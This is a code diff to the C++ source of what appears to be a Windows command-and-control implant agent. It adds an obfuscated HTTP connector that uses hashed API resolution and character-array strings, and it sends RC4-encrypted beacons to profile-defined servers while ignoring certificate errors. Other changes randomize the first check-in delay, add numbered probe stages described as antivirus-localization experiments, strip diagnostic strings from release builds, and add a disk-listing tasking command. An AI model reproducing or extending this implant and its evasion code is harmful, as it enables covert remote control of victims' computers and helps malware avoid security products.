@@ -4,6 +4,7 @@
 #include "Commander.h"
 #include "utils.h"
 #include "Crypt.h"
+#include "Encoders.h"
 #include "WaitMask.h"
 #include "Connector.h"
 #include "ConnectorHTTP.h"
@@ -37,12 +38,424 @@
 #define DIRECT_HTTPS_MEMORY_LOADER_DIAG 0
 #endif
 
+#ifndef DIRECT_HTTPS_FAST_FIRST_LOOPS
+#define DIRECT_HTTPS_FAST_FIRST_LOOPS 0
+#endif
+
+#ifndef DIRECT_HTTPS_INITIAL_CHECKIN_MIN_MS
+#define DIRECT_HTTPS_INITIAL_CHECKIN_MIN_MS 0
+#endif
+
+#ifndef DIRECT_HTTPS_INITIAL_CHECKIN_MAX_MS
+#define DIRECT_HTTPS_INITIAL_CHECKIN_MAX_MS 0
+#endif
+
+#ifndef DIRECT_HTTPS_HEARTBEAT_ONLY
+#define DIRECT_HTTPS_HEARTBEAT_ONLY 0
+#endif
+
+#ifndef DIRECT_HTTPS_HELLO_ONLY
+#define DIRECT_HTTPS_HELLO_ONLY 0
+#endif
+
+#ifndef DIRECT_HTTPS_LITE_CONNECTOR
+#define DIRECT_HTTPS_LITE_CONNECTOR 0
+#endif
+
 #ifndef DIRECT_HTTPS_TRIGGER_FILE_PATH
 #define DIRECT_HTTPS_TRIGGER_FILE_PATH "C:\\Users\\Public\\norton_trigger.txt"
 #endif
 
+#ifndef DIRECT_HTTPS_PROBE_HOST
+#define DIRECT_HTTPS_PROBE_HOST "127.0.0.1"
+#endif
+
 Agent* g_Agent;
 Connector* g_Connector;
+
+#if DIRECT_HTTPS_LITE_CONNECTOR
+// ConnectorLite keeps the Connector contract but delays all network state until
+// the first Exchange call.  The normal ConnectorHTTP implementation remains
+// available for builds that need its probe surface.
+class ConnectorLite final : public Connector
+{
+	ProfileHTTP profile = {};
+	HTTPFUNC* functions = NULL;
+	HMODULE wininet = NULL;
+	HINTERNET internet = NULL;
+	HINTERNET connect = NULL;
+	CHAR* headers = NULL;
+	BYTE* recvData = NULL;
+	int recvSize = 0;
+	ULONG serverIndex = 0;
+	ULONG uriIndex = 0;
+	ULONG uaIndex = 0;
+	ULONG hostIndex = 0;
+
+	BOOL EnsureNetwork();
+	void SendData(BYTE* data, ULONG dataSize);
+
+public:
+	ConnectorLite() {}
+
+	static void* operator new(size_t sz)
+	{
+		return MemAllocLocal((DWORD)sz);
+	}
+
+	static void operator delete(void* p) noexcept
+	{
+		MemFreeLocal(&p, sizeof(ConnectorLite));
+	}
+
+	BOOL SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize) override;
+	void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
+	void CloseConnector() override;
+	BYTE* RecvData() override;
+	int RecvSize() override;
+	void RecvClear() override;
+	DWORD ProbeRequestStage(ULONG stage, BOOL forcePlainHttp8000);
+};
+
+BOOL ConnectorLite::EnsureNetwork()
+{
+	if (!this->functions) {
+		this->functions = (HTTPFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC));
+		if (!this->functions)
+			return FALSE;
+		this->functions->LocalAlloc = ApiWin->LocalAlloc;
+		this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
+		this->functions->LocalFree = ApiWin->LocalFree;
+		this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
+		this->functions->GetProcAddress = ApiWin->GetProcAddress;
+		this->functions->GetLastError = ApiWin->GetLastError;
+	}
+
+	if (!this->wininet) {
+		CHAR name[] = { 'w','i','n','i','n','e','t','.','d','l','l',0 };
+		this->wininet = ApiWin->LoadLibraryA(name);
+	}
+	if (!this->wininet)
+		return FALSE;
+
+#if DIRECT_HTTPS_NO_API_HASHING
+	this->functions->InternetOpenA = (decltype(InternetOpenA)*)ApiWin->GetProcAddress(this->wininet, "InternetOpenA");
+	this->functions->InternetConnectA = (decltype(InternetConnectA)*)ApiWin->GetProcAddress(this->wininet, "InternetConnectA");
+	this->functions->HttpOpenRequestA = (decltype(HttpOpenRequestA)*)ApiWin->GetProcAddress(this->wininet, "HttpOpenRequestA");
+	this->functions->HttpSendRequestA = (decltype(HttpSendRequestA)*)ApiWin->GetProcAddress(this->wininet, "HttpSendRequestA");
+	this->functions->InternetSetOptionA = (decltype(InternetSetOptionA)*)ApiWin->GetProcAddress(this->wininet, "InternetSetOptionA");
+	this->functions->InternetQueryOptionA = (decltype(InternetQueryOptionA)*)ApiWin->GetProcAddress(this->wininet, "InternetQueryOptionA");
+	this->functions->HttpQueryInfoA = (decltype(HttpQueryInfoA)*)ApiWin->GetProcAddress(this->wininet, "HttpQueryInfoA");
+	this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*)ApiWin->GetProcAddress(this->wininet, "InternetQueryDataAvailable");
+	this->functions->InternetCloseHandle = (decltype(InternetCloseHandle)*)ApiWin->GetProcAddress(this->wininet, "InternetCloseHandle");
+	this->functions->InternetReadFile = (decltype(InternetReadFile)*)ApiWin->GetProcAddress(this->wininet, "InternetReadFile");
+#else
+	this->functions->InternetOpenA = (decltype(InternetOpenA)*)GetSymbolAddress(this->wininet, HASH_FUNC_INTERNETOPENA);
+	this->functions->InternetConnectA = (decltype(InternetConnectA)*)GetSymbolAddress(this->wininet, HASH_FUNC_INTERNETCONNECTA);
+	this->functions->HttpOpenRequestA = (decltype(HttpOpenRequestA)*)GetSymbolAddress(this->wininet, HASH_FUNC_HTTPOPENREQUESTA);
+	this->functions->HttpSendRequestA = (decltype(HttpSendRequestA)*)GetSymbolAddress(this->wininet, HASH_FUNC_HTTPSENDREQUESTA);
+	this->functions->InternetSetOptionA = (decltype(InternetSetOptionA)*)GetSymbolAddress(this->wininet, HASH_FUNC_INTERNETSETOPTIONA);
+	this->functions->InternetQueryOptionA = (decltype(InternetQueryOptionA)*)GetSymbolAddress(this->wininet, HASH_FUNC_INTERNETQUERYOPTIONA);
+	this->functions->HttpQueryInfoA = (decltype(HttpQueryInfoA)*)GetSymbolAddress(this->wininet, HASH_FUNC_HTTPQUERYINFOA);
+	this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*)GetSymbolAddress(this->wininet, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
+	this->functions->InternetCloseHandle = (decltype(InternetCloseHandle)*)GetSymbolAddress(this->wininet, HASH_FUNC_INTERNETCLOSEHANDLE);
+	this->functions->InternetReadFile = (decltype(InternetReadFile)*)GetSymbolAddress(this->wininet, HASH_FUNC_INTERNETREADFILE);
+#endif
+
+	return this->functions->InternetOpenA && this->functions->InternetConnectA &&
+		this->functions->HttpOpenRequestA && this->functions->HttpSendRequestA &&
+		this->functions->InternetCloseHandle && this->functions->InternetReadFile;
+}
+
+BOOL ConnectorLite::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
+{
+	if (!profilePtr || !beat || !beatSize)
+		return FALSE;
+
+	ProfileHTTP incoming = *(ProfileHTTP*)profilePtr;
+	CHAR* encoded = b64_encode(beat, (int)beatSize);
+	if (!encoded)
+		return FALSE;
+
+	ULONG baseLen = incoming.http_headers ? StrLenA((CHAR*)incoming.http_headers) : 0;
+	ULONG nameLen = incoming.parameter ? StrLenA((CHAR*)incoming.parameter) : 0;
+	ULONG encLen = StrLenA(encoded);
+	CHAR closeHeader[] = { 'C','o','n','n','e','c','t','i','o','n',':',' ','c','l','o','s','e','\r','\n',0 };
+	ULONG closeLen = StrLenA(closeHeader);
+	ULONG total = baseLen + nameLen + encLen + closeLen + 5;
+	CHAR* nextHeaders = (CHAR*)ApiWin->LocalAlloc(LPTR, total);
+	if (!nextHeaders) {
+		ApiWin->LocalFree(encoded);
+		return FALSE;
+	}
+
+	ULONG at = 0;
+	if (baseLen) {
+		memcpy(nextHeaders + at, incoming.http_headers, baseLen);
+		at += baseLen;
+	}
+	if (nameLen) {
+		memcpy(nextHeaders + at, incoming.parameter, nameLen);
+		at += nameLen;
+	}
+	nextHeaders[at++] = ':';
+	nextHeaders[at++] = ' ';
+	memcpy(nextHeaders + at, encoded, encLen);
+	at += encLen;
+	nextHeaders[at++] = '\r';
+	nextHeaders[at++] = '\n';
+	memcpy(nextHeaders + at, closeHeader, closeLen);
+	at += closeLen;
+	nextHeaders[at] = 0;
+
+	ApiWin->LocalFree(encoded);
+	if (this->headers)
+		ApiWin->LocalFree(this->headers);
+	this->headers = nextHeaders;
+	this->profile = incoming;
+	return TRUE;
+}
+
+void ConnectorLite::SendData(BYTE* data, ULONG dataSize)
+{
+	this->recvSize = 0;
+	if (!this->EnsureNetwork() || !this->profile.servers_count || !this->profile.uri_count)
+		return;
+
+	if (this->connect) {
+		this->functions->InternetCloseHandle(this->connect);
+		this->connect = NULL;
+	}
+	if (this->internet) {
+		this->functions->InternetCloseHandle(this->internet);
+		this->internet = NULL;
+	}
+
+	CHAR fallbackUA[] = { 'M','o','z','i','l','l','a','/','5','.','0',0 };
+	CHAR* ua = fallbackUA;
+	if (this->profile.ua_count && this->profile.user_agents)
+		ua = (CHAR*)this->profile.user_agents[this->uaIndex % this->profile.ua_count];
+	CHAR* server = (CHAR*)this->profile.servers[this->serverIndex % this->profile.servers_count];
+	CHAR* uri = (CHAR*)this->profile.uris[this->uriIndex % this->profile.uri_count];
+
+	this->internet = this->functions->InternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	if (!this->internet)
+		return;
+	DWORD context = 0;
+	this->connect = this->functions->InternetConnectA(this->internet, server,
+		this->profile.ports[this->serverIndex % this->profile.servers_count], NULL, NULL,
+		INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);
+	if (!this->connect)
+		return;
+
+	CHAR accept[] = { '*','/','*',0 };
+	LPCSTR accepts[] = { accept, NULL };
+	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
+	if (this->profile.use_ssl)
+		flags |= INTERNET_FLAG_SECURE;
+	HINTERNET request = this->functions->HttpOpenRequestA(this->connect,
+		(CHAR*)this->profile.http_method, uri, NULL, NULL, accepts, flags, (DWORD_PTR)&context);
+	if (!request)
+		return;
+
+	if (this->profile.use_ssl && this->functions->InternetQueryOptionA && this->functions->InternetSetOptionA) {
+		DWORD security = 0;
+		DWORD securityLen = sizeof(security);
+		if (!this->functions->InternetQueryOptionA(request, INTERNET_OPTION_SECURITY_FLAGS, &security, &securityLen))
+			security = 0;
+		security |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+			SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION |
+			SECURITY_FLAG_IGNORE_WRONG_USAGE;
+		this->functions->InternetSetOptionA(request, INTERNET_OPTION_SECURITY_FLAGS, &security, sizeof(security));
+	}
+
+	BOOL sent = this->functions->HttpSendRequestA(request, this->headers,
+		(DWORD)StrLenA(this->headers), data, (DWORD)dataSize);
+	if (sent && this->functions->InternetQueryDataAvailable) {
+		BYTE* buffer = NULL;
+		ULONG total = 0;
+		for (;;) {
+			DWORD available = 0;
+			if (!this->functions->InternetQueryDataAvailable(request, &available, 0, 0) || !available)
+				break;
+			BYTE* grown = buffer ? (BYTE*)this->functions->LocalReAlloc(buffer, total + available, LMEM_MOVEABLE) :
+				(BYTE*)this->functions->LocalAlloc(LPTR, available);
+			if (!grown)
+				break;
+			buffer = grown;
+			DWORD read = 0;
+			if (!this->functions->InternetReadFile(request, buffer + total, available, &read) || !read)
+				break;
+			total += read;
+		}
+		if (total) {
+			this->recvData = buffer;
+			this->recvSize = (int)total;
+		}
+		else if (buffer) {
+			this->functions->LocalFree(buffer);
+		}
+	}
+
+	this->functions->InternetCloseHandle(request);
+	this->functions->InternetCloseHandle(this->connect);
+	this->functions->InternetCloseHandle(this->internet);
+	this->connect = NULL;
+	this->internet = NULL;
+	this->serverIndex = (this->serverIndex + 1) % this->profile.servers_count;
+	this->uriIndex = (this->uriIndex + 1) % this->profile.uri_count;
+	if (this->profile.ua_count)
+		this->uaIndex = (this->uaIndex + 1) % this->profile.ua_count;
+}
+
+void ConnectorLite::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
+{
+	if (plainData && plainSize)
+		EncryptRC4(plainData, plainSize, sessionKey, 16);
+	this->SendData(plainData, plainSize);
+	if (this->recvData && this->RecvSize() > 0)
+		DecryptRC4(this->RecvData(), this->RecvSize(), sessionKey, 16);
+}
+
+BYTE* ConnectorLite::RecvData()
+{
+	return this->recvData ? this->recvData + this->profile.ans_pre_size : NULL;
+}
+
+int ConnectorLite::RecvSize()
+{
+	if (this->recvSize < (int)this->profile.ans_size)
+		return 0;
+	return this->recvSize - (int)this->profile.ans_size;
+}
+
+void ConnectorLite::RecvClear()
+{
+	if (this->recvData) {
+		MemFreeLocal((LPVOID*)&this->recvData, (DWORD)this->recvSize);
+		this->recvSize = 0;
+	}
+}
+
+void ConnectorLite::CloseConnector()
+{
+	if (this->connect && this->functions)
+		this->functions->InternetCloseHandle(this->connect);
+	if (this->internet && this->functions)
+		this->functions->InternetCloseHandle(this->internet);
+	this->connect = NULL;
+	this->internet = NULL;
+	if (this->headers)
+		ApiWin->LocalFree(this->headers);
+	this->headers = NULL;
+	if (this->recvData)
+		this->RecvClear();
+	if (this->functions)
+		ApiWin->LocalFree(this->functions);
+	this->functions = NULL;
+}
+
+DWORD ConnectorLite::ProbeRequestStage(ULONG stage, BOOL forcePlainHttp8000)
+{
+	(void)stage;
+	(void)forcePlainHttp8000;
+	return 1599;
+}
+#endif
+
+static ULONG ReadBE32(const BYTE* data)
+{
+	return (((ULONG)data[0]) << 24) | (((ULONG)data[1]) << 16) | (((ULONG)data[2]) << 8) | ((ULONG)data[3]);
+}
+
+// Result envelope schema4：LPR4 | schema/be32 | flags/be32 | body_len/be32 | sectioned_body。
+// sectioned_body 使用自研 result bundle section，显式声明 codec/flags/payload_len。
+static VOID InitResultEnvelope(Packer* packer, ULONG codec)
+{
+	if (!packer)
+		return;
+	BYTE magic[4] = { 'L', 'P', 'R', '4' };
+	packer->PackFlatBytes(magic, 4);
+	packer->Pack32(DIRECT_HTTPS_RESULTS_V2_SCHEMA);
+	packer->Pack32(DIRECT_HTTPS_ENVELOPE_FLAG_SECTIONED);
+	packer->Pack32(0);
+	packer->Pack32(2);
+	packer->Pack32(DIRECT_HTTPS_SECTION_META);
+	packer->Pack32(16);
+	packer->Pack32(4);
+	packer->Pack32(DIRECT_HTTPS_SECTION_CAPABILITIES);
+	packer->Pack32(SELF_C2_RESULT_BUNDLE_V4_SCHEMA);
+	packer->Pack32(0);
+	packer->Pack32(SELF_C2_SECTION_RESULT_BUNDLE_V4);
+	packer->Pack32(0);
+	packer->Pack32(SELF_C2_RESULT_BUNDLE_V4_SCHEMA);
+	packer->Pack32(codec);
+	packer->Pack32(0);
+	packer->Pack32(0);
+}
+
+static BOOL HasResultRecords(Packer* packer)
+{
+	return packer && packer->datasize() > SELF_C2_RESULTS_V4_RECORD_OFFSET;
+}
+
+static VOID FinalizeResultEnvelope(Packer* packer)
+{
+	if (!packer || packer->datasize() < SELF_C2_RESULTS_V4_RECORD_OFFSET)
+		return;
+	ULONG payloadLen = packer->datasize() - SELF_C2_RESULTS_V4_RECORD_OFFSET;
+	packer->Set32(DIRECT_HTTPS_RESULTS_V2_BODY_OFFSET, packer->datasize() - DIRECT_HTTPS_RESULTS_V2_HEADER_SIZE);
+	packer->Set32(SELF_C2_RESULTS_V4_BUNDLE_SECTION_LEN_OFFSET, payloadLen + 16);
+	packer->Set32(SELF_C2_RESULTS_V4_BUNDLE_PAYLOAD_LEN_OFFSET, payloadLen);
+}
+
+static BOOL TryRewriteCompatPayloadToNativeCodec(Packer* packer)
+{
+	if (!packer || packer->datasize() <= SELF_C2_RESULTS_V4_RECORD_OFFSET)
+		return FALSE;
+
+	PBYTE payload = packer->data() + SELF_C2_RESULTS_V4_RECORD_OFFSET;
+	ULONG payloadLen = packer->datasize() - SELF_C2_RESULTS_V4_RECORD_OFFSET;
+	if (payloadLen < 12)
+		return FALSE;
+
+	ULONG taskId = ReadBE32(payload);
+	ULONG commandId = ReadBE32(payload + 4);
+	ULONG fieldLen = ReadBE32(payload + 8);
+	if (payloadLen != 12 + fieldLen)
+		return FALSE;
+
+	ULONG actionId = 0;
+	ULONG fieldType = 0;
+	switch (commandId) {
+	case COMMAND_HELLO:
+		actionId = SELF_C2_ACTION_HELLO;
+		fieldType = SELF_C2_NATIVE_RESULT_FIELD_TEXT;
+		break;
+	case COMMAND_PWD:
+		actionId = SELF_C2_ACTION_PWD;
+		fieldType = SELF_C2_NATIVE_RESULT_FIELD_PATH;
+		break;
+	default:
+		return FALSE;
+	}
+
+	Packer* rewritten = new Packer();
+	InitResultEnvelope(rewritten, SELF_C2_RESULT_CODEC_NATIVE_FIELDS);
+	rewritten->Pack32(1);
+	rewritten->Pack32(SELF_C2_NATIVE_RESULT_RECORD_V4_SCHEMA);
+	rewritten->Pack32(taskId);
+	rewritten->Pack32(actionId);
+	rewritten->Pack32(fieldType);
+	rewritten->Pack32(fieldLen);
+	if (fieldLen > 0)
+		rewritten->PackFlatBytes(payload + 12, fieldLen);
+
+	packer->Clear(TRUE);
+	packer->PackFlatBytes(rewritten->data(), rewritten->datasize());
+	delete rewritten;
+	return TRUE;
+}
 
 #if DIRECT_HTTPS_MEMORY_LOADER_DIAG
 // MemoryDiagLog 把 AgentMain 内部阶段追加到 loader 同一个日志文件。
@@ -92,14 +505,20 @@ static void MemoryDiagLogU32(LPCSTR prefix, ULONG value)
 	MemoryDiagLog(buf);
 }
 #else
-static void MemoryDiagLog(LPCSTR) {}
-static void MemoryDiagLogU32(LPCSTR, ULONG) {}
+// Compile diagnostic calls out entirely in production builds.  A no-op
+// function would still retain each call's string literal in the DLL.
+#define MemoryDiagLog(...) ((void)0)
+#define MemoryDiagLogU32(...) ((void)0)
 #endif
 
 // CreateConnector 创建当前使用的通信连接器，这里固定为 HTTP/HTTPS。
 static Connector* CreateConnector()
 {
+	#if DIRECT_HTTPS_LITE_CONNECTOR
+	return new ConnectorLite();
+	#else
 	return new ConnectorHTTP();
+	#endif
 }
 
 // ProbeSleepReturn 是 AV 定位实验用的辅助函数：sleep 一会儿再返回指定退出码。
@@ -136,7 +555,7 @@ static DWORD ProbeWininetRequest(BOOL ssl, WORD port, LPCSTR uri, DWORD code)
 	if (!hInternet)
 		return code + 102;
 
-	HINTERNET hConnect = pInternetConnectA(hInternet, "C2_HOST_PLACEHOLDER", port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+	HINTERNET hConnect = pInternetConnectA(hInternet, DIRECT_HTTPS_PROBE_HOST, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
 	if (!hConnect) {
 		pInternetCloseHandle(hInternet);
 		return code + 103;
@@ -194,6 +613,19 @@ static void SandboxProbeSleepMs(DWORD ms)
 		ApiWin->Sleep(ms);
 	else
 		::Sleep(ms);
+}
+
+// Delay only the first check-in in the learning build. Subsequent heartbeat
+// timing remains controlled by the profile sleep/jitter values.
+static void InitialCheckinDelay()
+{
+#if DIRECT_HTTPS_INITIAL_CHECKIN_MIN_MS > 0 && DIRECT_HTTPS_INITIAL_CHECKIN_MAX_MS >= DIRECT_HTTPS_INITIAL_CHECKIN_MIN_MS
+	ULONG span = (ULONG)(DIRECT_HTTPS_INITIAL_CHECKIN_MAX_MS - DIRECT_HTTPS_INITIAL_CHECKIN_MIN_MS + 1);
+	ULONG delay = (ULONG)DIRECT_HTTPS_INITIAL_CHECKIN_MIN_MS;
+	if (span > 1)
+		delay += GenerateRandom32() % span;
+	SandboxProbeSleepMs(delay);
+#endif
 }
 
 // SandboxLoadWininetNoSend 只加载 wininet.dll 并解析几个网络 API，不真正发送请求。
@@ -265,7 +697,7 @@ static DWORD SandboxHttpSend8001(LPCSTR method, LPCSTR uri, LPCSTR headers, LPVO
 	if (!hInternet)
 		return successCode + 1002;
 
-	HINTERNET hConnect = pInternetConnectA(hInternet, "C2_HOST_PLACEHOLDER", 8001, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+	HINTERNET hConnect = pInternetConnectA(hInternet, DIRECT_HTTPS_PROBE_HOST, 8001, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
 	if (!hConnect) {
 		pInternetCloseHandle(hInternet);
 		return successCode + 1003;
@@ -495,6 +927,25 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 	return ProbeSleepReturn(1336);
 #endif
 
+#if DIRECT_HTTPS_PROBE_STAGE == 37
+	AgentConfig* probeConfig = new AgentConfig();
+	g_Connector = CreateConnector();
+	BYTE tinyBeat[1] = { 0 };
+	if (!probeConfig || !g_Connector)
+		return 1437;
+	if (!g_Connector->SetProfile(&probeConfig->profile, tinyBeat, sizeof(tinyBeat)))
+		return 1537;
+	return ProbeSleepReturn(1337);
+#endif
+
+#if DIRECT_HTTPS_PROBE_STAGE == 38
+	AgentConfig* probeConfig = new AgentConfig();
+	g_Connector = CreateConnector();
+	if (!probeConfig || !g_Connector)
+		return 1438;
+	return ProbeSleepReturn(1338);
+#endif
+
 #if DIRECT_HTTPS_PROBE_STAGE == 41
 	void* probeCommanderMemory = Commander::operator new(sizeof(Commander));
 	return ProbeSleepReturn(probeCommanderMemory ? 1341 : 1441);
@@ -512,6 +963,7 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 		&Commander::CmdCat,
 		&Commander::CmdCd,
 		&Commander::CmdCp,
+		&Commander::CmdDisks,
 		&Commander::CmdDownload,
 		&Commander::CmdJobsKill,
 		&Commander::CmdLs,
@@ -711,6 +1163,7 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 	MemoryDiagLog("AGENT_SETPROFILE_OK");
 
 	MemFreeLocal((LPVOID*)&beat, beatSize);
+	InitialCheckinDelay();
 
 
 #if DIRECT_HTTPS_PROBE_STAGE == 80 || DIRECT_HTTPS_PROBE_STAGE == 82 || DIRECT_HTTPS_PROBE_STAGE == 85 || DIRECT_HTTPS_PROBE_STAGE == 90
@@ -735,7 +1188,8 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 #endif
 
 	Packer* packerOut = new Packer();
-	packerOut->Pack32(0);
+	InitResultEnvelope(packerOut, SELF_C2_RESULT_CODEC_COMPAT_BODY);
+	ULONG fastFirstLoops = DIRECT_HTTPS_FAST_FIRST_LOOPS;
 	MemoryDiagLog("AGENT_LOOP_READY");
 
 	do {
@@ -749,13 +1203,14 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 		do {
 			MemoryDiagLog("AGENT_INNER_LOOP");
 			MemoryDiagLogU32("AGENT_OUT_DATASIZE_PRE=", packerOut->datasize());
-			if (packerOut->datasize() > 4) {
-				packerOut->Set32(0, packerOut->datasize());
+			if (HasResultRecords(packerOut)) {
+				TryRewriteCompatPayloadToNativeCodec(packerOut);
+				FinalizeResultEnvelope(packerOut);
 				MemoryDiagLog("AGENT_EXCHANGE_WITH_OUTPUT_BEGIN");
 				g_Connector->Exchange(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey);
 				MemoryDiagLog("AGENT_EXCHANGE_WITH_OUTPUT_END");
 				packerOut->Clear(TRUE);
-				packerOut->Pack32(0);
+				InitResultEnvelope(packerOut, SELF_C2_RESULT_CODEC_COMPAT_BODY);
 			}
 			else {
 				MemoryDiagLog("AGENT_EXCHANGE_EMPTY_BEGIN");
@@ -765,9 +1220,11 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 
 			MemoryDiagLogU32("AGENT_RECV_SIZE=", (ULONG)g_Connector->RecvSize());
 			if (g_Connector->RecvSize() > 0 && g_Connector->RecvData()) {
+#if !DIRECT_HTTPS_HEARTBEAT_ONLY
 				MemoryDiagLog("AGENT_PROCESS_TASKS_BEGIN");
 				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
 				MemoryDiagLog("AGENT_PROCESS_TASKS_END");
+#endif
 			}
 			g_Connector->RecvClear();
 			MemoryDiagLogU32("AGENT_OUT_DATASIZE_POST=", packerOut->datasize());
@@ -778,11 +1235,18 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 #endif
 
 			if (g_Agent->IsActive()) {
-				const BOOL hasOutput = (packerOut->datasize() >= 8);
+				const BOOL hasOutput = HasResultRecords(packerOut);
 				MemoryDiagLogU32("AGENT_SLEEP_HAS_OUTPUT=", hasOutput ? 1 : 0);
-				MemoryDiagLog("AGENT_SLEEP_BEGIN");
-				g_Connector->Sleep(NULL, g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput);
-				MemoryDiagLog("AGENT_SLEEP_END");
+				if (!hasOutput && fastFirstLoops > 0) {
+					MemoryDiagLogU32("AGENT_FAST_FIRST_LOOP_SKIP_SLEEP_REMAIN=", fastFirstLoops);
+					fastFirstLoops--;
+					SandboxProbeSleepMs(100);
+				}
+				else {
+					MemoryDiagLog("AGENT_SLEEP_BEGIN");
+					g_Connector->Sleep(NULL, g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput);
+					MemoryDiagLog("AGENT_SLEEP_END");
+				}
 			}
 			else {
 				MemoryDiagLog("AGENT_INACTIVE_AFTER_TASKS");
@@ -790,10 +1254,10 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 
 		} while (g_Connector->IsConnected() && g_Agent->IsActive());
 
-		if (!g_Agent->IsActive() && g_Connector->IsConnected()) {
+		if (!DIRECT_HTTPS_HEARTBEAT_ONLY && !DIRECT_HTTPS_HELLO_ONLY && !g_Agent->IsActive() && g_Connector->IsConnected()) {
 			MemoryDiagLog("AGENT_EXIT_RESPONSE_BEGIN");
 			g_Agent->commander->Exit(packerOut);
-			packerOut->Set32(0, packerOut->datasize());
+			FinalizeResultEnvelope(packerOut);
 			g_Connector->Exchange(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey);
 			g_Connector->RecvClear();
 			MemoryDiagLog("AGENT_EXIT_RESPONSE_END");
